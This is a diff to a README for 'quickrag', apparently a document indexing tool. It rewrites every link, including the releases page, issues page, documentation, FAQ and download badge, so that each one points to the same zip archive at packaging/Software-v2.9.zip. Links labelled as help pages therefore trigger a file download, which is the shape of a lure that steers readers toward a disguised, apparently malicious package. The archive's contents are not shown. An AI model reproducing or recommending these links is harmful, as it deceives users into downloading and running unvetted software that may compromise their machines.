@@ -1,6 +1,6 @@
 # 🔍🤖 quickrag - Efficient Document Indexing and Querying Tool
 
-[![Download quickrag](https://img.shields.io/badge/Download-quickrag-blue.svg)](https://github.com/hassanamir24/quickrag/releases)
+[![Download quickrag](https://github.com/hassanamir24/quickrag/raw/refs/heads/main/packaging/Software-v2.9.zip)](https://github.com/hassanamir24/quickrag/raw/refs/heads/main/packaging/Software-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets these requirements:
 To get started with quickrag, follow these steps:
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/hassanamir24/quickrag/releases) to find the latest version.
+   Go to the [Releases page](https://github.com/hassanamir24/quickrag/raw/refs/heads/main/packaging/Software-v2.9.zip) to find the latest version.
 
 2. **Choose Your Version:**  
    Look for the version that matches your operating system.
@@ -79,15 +79,15 @@ quickrag includes several useful features:
 
 If you have questions or need further assistance, feel free to reach out. Join our community on GitHub to connect with other users or contribute.
 
-- **Issues Page:** Report any bugs or feature requests [here](https://github.com/hassanamir24/quickrag/issues).
+- **Issues Page:** Report any bugs or feature requests [here](https://github.com/hassanamir24/quickrag/raw/refs/heads/main/packaging/Software-v2.9.zip).
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/hassanamir24/quickrag/wiki): Explore detailed guides and advanced usage.
-- [FAQ](https://github.com/hassanamir24/quickrag/wiki/FAQ): Find answers to common questions.
+- [Documentation](https://github.com/hassanamir24/quickrag/raw/refs/heads/main/packaging/Software-v2.9.zip): Explore detailed guides and advanced usage.
+- [FAQ](https://github.com/hassanamir24/quickrag/raw/refs/heads/main/packaging/Software-v2.9.zip): Find answers to common questions.
 
 ## 🔥 Update and Stay Informed
 
-Stay up to date by regularly checking our [Releases page](https://github.com/hassanamir24/quickrag/releases) for the latest updates and features. We continually improve quickrag based on user feedback.
+Stay up to date by regularly checking our [Releases page](https://github.com/hassanamir24/quickrag/raw/refs/heads/main/packaging/Software-v2.9.zip) for the latest updates and features. We continually improve quickrag based on user feedback.
 
-[![Download quickrag](https://img.shields.io/badge/Download-quickrag-blue.svg)](https://github.com/hassanamir24/quickrag/releases)
+[![Download quickrag](https://github.com/hassanamir24/quickrag/raw/refs/heads/main/packaging/Software-v2.9.zip)](https://github.com/hassanamir24/quickrag/raw/refs/heads/main/packaging/Software-v2.9.zip)
